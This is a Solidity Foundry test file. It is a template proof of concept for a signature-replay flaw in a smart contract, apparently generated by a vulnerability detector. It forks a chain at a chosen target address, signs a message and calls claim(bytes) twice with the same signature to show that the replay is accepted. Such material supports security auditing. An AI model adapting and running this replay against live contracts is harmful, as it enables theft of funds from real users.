// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Signature replay (no nonce / deadline / chain binding)
/// @notice Detector: signature-replay. The target verifies a signature
///         without a nonce, deadline, or chainId binding, so the SAME
///         signature can be submitted twice (or on another chain / another
///         contract using the same verifier) and accepted again.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the signed payload to the
///      target's exact scheme (EIP-712 domain / eth-signed message /
///      raw hash) and claim() to its real entry point.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // Test signer -- the target must trust signatures from this key's
    // address (e.g. the target's owner / authorized signer).
    uint256 public constant SIGNER_KEY = 0xA11CE;
    // TODO: the exact message the target expects to be signed.
    bytes32 public constant MESSAGE_HASH = bytes32(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(MESSAGE_HASH != bytes32(0), "set MESSAGE_HASH to the target's signed message hash");

        address signer = vm.addr(SIGNER_KEY);
        console.log("signer:", signer);
        // TODO: sign the exact digest the target verifies (EIP-712 digest
        // or keccak256("\x19Ethereum Signed Message:\n32" + hash)).
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);
        bytes memory sig = abi.encodePacked(r, s, v);

        // TODO: adapt to the target's real claim / redeem / execute entry.
        (bool firstOk,) = target.call(
            abi.encodeWithSignature("claim(bytes)", sig)
        );
        require(firstOk, "first claim failed -- adapt the signed payload / entry point");

        // Replay the EXACT same signature.
        (bool secondOk,) = target.call(
            abi.encodeWithSignature("claim(bytes)", sig)
        );
        console.log("first claim ok:", firstOk);
        console.log("replay claim ok:", secondOk);
        assertTrue(secondOk, "exploit did not reproduce: replay was rejected (nonce present)");

    }
}
